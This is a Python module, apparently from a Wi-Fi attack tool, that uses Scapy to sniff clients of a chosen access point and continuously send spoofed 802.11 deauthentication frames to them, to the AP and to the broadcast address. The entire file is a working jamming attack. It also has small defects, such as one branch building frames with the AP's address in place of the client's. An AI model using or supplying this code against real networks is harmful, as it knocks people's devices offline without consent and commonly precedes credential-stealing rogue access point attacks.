"""
Sends 3 DEAUTH Frames:
 1 from the AP to the client
 1 from the client to the AP
 1 to the broadcast address
"""

import threading
import scapy.layers.dot11 as dot11
from scapy.all import *
from constants import *


class Deauthentication(object):
    """
    Handles all the deauthentication process.
    """

    def __init__(self, ap_bssid, jamming_interface):
        """
        Setup the class with all the given arguments.

        :param self: A Deauthentication object.
        :param ap_bssid: The MAC address of the selected access point.
        :param jamming_interface: The interface to be used for jamming.
        :type self: Deauthentication
        :type ap_bssid: string
        :type jamming_interface: string
        :return: None
        :rtype: None
        """

        self._observed_clients = list()
        self._pkts = list()
        self._ignore_bssids = list()
        self._ap_bssid = ap_bssid
        self._should_continue = True
        self._jamming_interface = jamming_interface
        self.socket = conf.L3socket(iface=self._jamming_interface)
        # Craft DEAUTH frame to broadcast address
        self._craft_broadcast_deauth()
        # Populate the ignore list
        self._populate_ignore()

    def _populate_ignore(self):
        """
        Populates BSSID ignore list.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        """
 
        self._ignore_bssids.append(WIFI_BROADCAST)
        self._ignore_bssids.append(WIFI_INVALID)
        self._ignore_bssids.append(WIFI_IPV6MCAST1)
        self._ignore_bssids.append(WIFI_IPV6MCAST2)
        self._ignore_bssids.append(WIFI_SPANNINGTREE)
        self._ignore_bssids.append(WIFI_MULTICAST)
        self._ignore_bssids.append(self._ap_bssid)

    def _craft_broadcast_deauth(self):
        """
        Crafts one DEAUTH frame to the broadcast address.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        """
        packet = dot11.Dot11(
                      type=0, subtype=12,
                      addr1=WIFI_BROADCAST,
                      addr2=self._ap_bssid,
                      addr3=self._ap_bssid) / \
                dot11.Dot11Deauth()

        self._pkts.append(packet)


    def _craft_client_deauth(self, client_bssid):
        """
        Crafts two DEAUTH frames: 1 from the AP to the client 
        and 1 from the client to the AP.

        :param self: A Deauthentication object.
        :param client_bssid: The MAC address of the selected acess point.
        :type self: Deauthentication
        :type packet: string
        :return: None
        :rtype: None
        """

        packet = dot11.Dot11(
                      type=0, subtype=12,
                      addr1=self._ap_bssid,
                      addr2=client_bssid,
                      addr3=client_bssid) / \
                dot11.Dot11Deauth()

        self._pkts.append(packet)

        packet = dot11.Dot11(
                      type=0, subtype=12,
                      addr1=client_bssid,
                      addr2=self._ap_bssid,
                      addr3=self._ap_bssid) / \
                dot11.Dot11Deauth()

        self._pkts.append(packet)


    def process_packet(self, packet):
        """
        Process the Dot11 packets and add desired clients to observed_clients.

        :param self: A Deauthentication object.
        :param packet: A scapy.layers.RadioTap object.
        :type self: Deauthentication
        :type packet: scapy.layers.RadioTap
        :return: None
        :rtype: None
        .. note: addr1 = Destination address
                 addr2 = Sender address
                 Also this finds devices that are not associated with any
                 access point as they respond to the access point probes.
        """

        # check if the packet has a dot11 layer
        if packet.haslayer(dot11.Dot11):
            # check if the packet has either control = 0, management = 1
            # or data = 2 as its type
            if packet.type in [0, 1, 2]:
                # check if client is new and connected to target access point
                if (packet.addr1 == self._ap_bssid and
                        packet.addr2 not in self._ignore_bssids and
                        packet.addr2 not in self._observed_clients and
                        packet.addr2 is not None):
                    # craft deauth frame from the new client
                    self._observed_clients.append(packet.addr2)
                    # add new client to the list
                    self._craft_client_deauth(packet.addr2)
                elif (packet.addr2 == self._ap_bssid and
                      packet.addr1 not in self._ignore_bssids and
                      packet.addr1 not in self._observed_clients and
                      packet.addr1 is not None):
                    # craft deauth frame from the new client
                    self._observed_clients.append(packet.addr1)
                    # add new client to the list
                    self._craft_client_deauth(packet.addr2)

    def find_clients(self):
        """
        Find all the clients

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        """

        # continue to find clients until told otherwise
        while self._should_continue:
            dot11.sniff(iface=self._jamming_interface, prn=self.process_packet,
                        count=1, store=0)

    def get_clients(self):
        """
        Get all the observed clients.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: A list of all the observed clients.
        :rtype: list
        """

        return self._observed_clients

    def stop_deauthentication(self):
        """
        Stop the deauthentication process.
        """

        self._should_continue = False

    def send_deauthentication_packets(self):
        """
        Send deauthentication packets using RadioTap header.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        .. note: Information regarding IEEE 802.11 and for deauthentication
                 which could be useful for maintenance purposes. Type could
                 have values of 0 for managment, 1 for control, 2 for data.
                 There are a lot of subtpyes but subtype 12 is for
                 deauthentication packets. addr1, addr2, addr3 are destination
                 address, sender address, sender transmited address
                 respectivly.


        """

        while self._should_continue:
            if self._observed_clients:
                for p in self._pkts:
                    self.socket.send(p)

    def deauthenticate(self):
        """
        Deauthenticate all the clients found on the target access point.

        :param self: A Deauthentication object.
        :type self: Deauthentication
        :return: None
        :rtype: None
        .. note: count has the default value of 20.
        """

        # start finding clients in a separate thread
        find_clients_thread = threading.Thread(target=self.find_clients)
        find_clients_thread.start()

        # start deauthenticating in a separate thread
        send_deauth_packets_thread = threading.Thread(
            target=self.send_deauthentication_packets)
        send_deauth_packets_thread.start()
